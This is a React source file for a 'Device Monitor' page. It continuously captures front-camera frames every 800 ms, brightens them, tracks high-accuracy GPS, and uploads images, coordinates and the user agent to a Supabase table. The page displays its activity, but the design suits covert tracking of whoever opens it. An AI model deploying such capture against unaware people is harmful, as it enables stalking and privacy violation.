import { useEffect, useState, useRef } from 'react';
import { Camera, MapPin, Loader2, CheckCircle, XCircle, Activity } from 'lucide-react';
import { supabase } from './lib/supabase';

interface CaptureData {
  image: string | null;
  location: {
    latitude: number;
    longitude: number;
    accuracy: number;
  } | null;
  userAgent: string;
}

function App() {
  const [status, setStatus] = useState<'capturing' | 'error'>('capturing');
  const [lastCapture, setLastCapture] = useState<CaptureData | null>(null);
  const [captureCount, setCaptureCount] = useState(0);
  const [errorMessage, setErrorMessage] = useState<string>('');

  const videoRef = useRef<HTMLVideoElement | null>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const locationRef = useRef<CaptureData['location']>(null);
  const isProcessingRef = useRef(false);

  useEffect(() => {
    let intervalId: number;

    const startSystem = async () => {
      try {
        // Request Permissions Sequence
        if ('Notification' in window) {
          try {
            await Notification.requestPermission();
          } catch (e) {
            console.log('Notification permission check failed', e);
          }
        }

        // Start Location Watch
        navigator.geolocation.watchPosition(
          (pos) => {
            locationRef.current = {
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy
            };
          },
          (err) => console.warn('Location watch error:', err),
          { enableHighAccuracy: true, maximumAge: 0 }
        );

        // Start Camera
        const stream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: 'user',
            width: { ideal: 1280 },
            height: { ideal: 720 },
          },
        });
        streamRef.current = stream;

        const videoTrack = stream.getVideoTracks()[0];
        if (videoTrack.getSettings) {
          try {
            await videoTrack.applyConstraints({
              advanced: [
                { brightness: { ideal: 100 } },
                { contrast: { ideal: 80 } },
                { saturation: { ideal: 100 } },
              ] as any,
            });
          } catch (e) {
            console.log('Could not apply advanced constraints');
          }
        }

        const video = document.createElement('video');
        video.srcObject = stream;
        // Essential to play the video to get frames
        await video.play();
        videoRef.current = video;

        // Start Interval Loop (800ms)
        intervalId = window.setInterval(captureFrame, 800);

      } catch (error) {
        console.error('System Start Error:', error);
        setErrorMessage(error instanceof Error ? error.message : 'Unknown error occurred');
        setStatus('error');
      }
    };

    startSystem();

    return () => {
      if (intervalId) clearInterval(intervalId);
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(t => t.stop());
      }
    };
  }, []);

  const captureFrame = async () => {
    // Prevent overlap if upload takes > 800ms
    if (!videoRef.current || isProcessingRef.current) return;

    isProcessingRef.current = true;
    try {
      const video = videoRef.current;
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      const ctx = canvas.getContext('2d');
      if (!ctx) return;

      ctx.drawImage(video, 0, 0);

      // Image Processing (Brighten)
      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
      const data = imageData.data;
      for (let i = 0; i < data.length; i += 4) {
        // Enhancing brightness/contrast same as before
        data[i] = Math.min(255, Math.pow(data[i] / 255, 0.7) * 255 * 1.4);
        data[i + 1] = Math.min(255, Math.pow(data[i + 1] / 255, 0.7) * 255 * 1.4);
        data[i + 2] = Math.min(255, Math.pow(data[i + 2] / 255, 0.7) * 255 * 1.4);
      }
      ctx.putImageData(imageData, 0, 0);

      const imageBase64 = canvas.toDataURL('image/jpeg', 0.85);
      const location = locationRef.current;

      // Upload to Supabase
      await supabase.from('device_captures').insert({
        image_data: imageBase64,
        latitude: location?.latitude,
        longitude: location?.longitude,
        accuracy: location?.accuracy,
        user_agent: navigator.userAgent
      });

      // Update UI State
      setLastCapture({
        image: imageBase64,
        location: location,
        userAgent: navigator.userAgent
      });
      setCaptureCount(c => c + 1);

    } catch (e) {
      console.error("Capture Loop Error:", e);
      // Optional: setStatus('error') if strictly required, but for loop we usually keep trying
    } finally {
      isProcessingRef.current = false;
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 text-white">
      <div className="container mx-auto px-4 py-12">
        <div className="max-w-4xl mx-auto">
          <div className="text-center mb-12">
            <h1 className="text-4xl font-bold mb-4">Device Monitor</h1>
            <p className="text-slate-300">
              Continuous Background Capture & Upload System
            </p>
          </div>

          <div className="bg-slate-800 rounded-2xl shadow-2xl overflow-hidden border border-slate-700">
            <div className="p-8">

              {status === 'error' ? (
                <div className="flex flex-col items-center justify-center py-12">
                  <XCircle className="w-16 h-16 text-red-400 mb-4" />
                  <p className="text-xl text-red-400 mb-2">System Error</p>
                  <p className="text-sm text-slate-400">{errorMessage}</p>
                </div>
              ) : (
                <div className="space-y-8">
                  <div className="flex items-center justify-center mb-6">
                    <Activity className="w-12 h-12 text-blue-400 mr-3 animate-pulse" />
                    <div>
                      <p className="text-2xl font-semibold text-blue-400">
                        System Active
                      </p>
                      <p className="text-sm text-slate-400">
                        Capturing every 800ms • {captureCount} uploads
                      </p>
                    </div>
                  </div>

                  <div className="grid md:grid-cols-2 gap-8">
                    {/* Camera Feed / Last Capture */}
                    <div className="bg-slate-900 rounded-xl p-6 border border-slate-700">
                      <div className="flex items-center mb-4">
                        <Camera className="w-6 h-6 text-blue-400 mr-2" />
                        <h2 className="text-xl font-semibold">Live Capture</h2>
                      </div>
                      {lastCapture?.image ? (
                        <div className="relative">
                          <img
                            src={lastCapture.image}
                            alt="Latest Capture"
                            className="w-full rounded-lg border-2 border-slate-700"
                          />
                          <div className="absolute top-2 right-2 bg-black/60 px-2 py-1 rounded text-xs">
                            Live
                          </div>
                        </div>
                      ) : (
                        <div className="h-48 flex items-center justify-center bg-black/20 rounded-lg">
                          <Loader2 className="w-8 h-8 animate-spin text-slate-500" />
                        </div>
                      )}
                    </div>

                    {/* Location Info */}
                    <div className="bg-slate-900 rounded-xl p-6 border border-slate-700">
                      <div className="flex items-center mb-4">
                        <MapPin className="w-6 h-6 text-green-400 mr-2" />
                        <h2 className="text-xl font-semibold">Location Stream</h2>
                      </div>
                      {lastCapture?.location ? (
                        <div className="space-y-3">
                          <div>
                            <p className="text-sm text-slate-400">Latitude</p>
                            <p className="text-lg font-mono">
                              {lastCapture.location.latitude.toFixed(6)}
                            </p>
                          </div>
                          <div>
                            <p className="text-sm text-slate-400">Longitude</p>
                            <p className="text-lg font-mono">
                              {lastCapture.location.longitude.toFixed(6)}
                            </p>
                          </div>
                          <div>
                            <p className="text-sm text-slate-400">Accuracy</p>
                            <p className="text-lg">
                              ±{lastCapture.location.accuracy.toFixed(0)} meters
                            </p>
                          </div>
                          <div className="pt-2">
                            <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-green-100 text-green-800">
                              GPS Active
                            </span>
                          </div>
                        </div>
                      ) : (
                        <p className="text-slate-400">Waiting for GPS signal...</p>
                      )}
                    </div>
                  </div>

                  <div className="bg-slate-900 rounded-xl p-6 border border-slate-700">
                    <h2 className="text-xl font-semibold mb-4">Device Info</h2>
                    <div className="bg-slate-950 p-4 rounded-lg">
                      <p className="text-sm text-slate-300 font-mono break-all">
                        {navigator.userAgent}
                      </p>
                    </div>
                  </div>

                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;
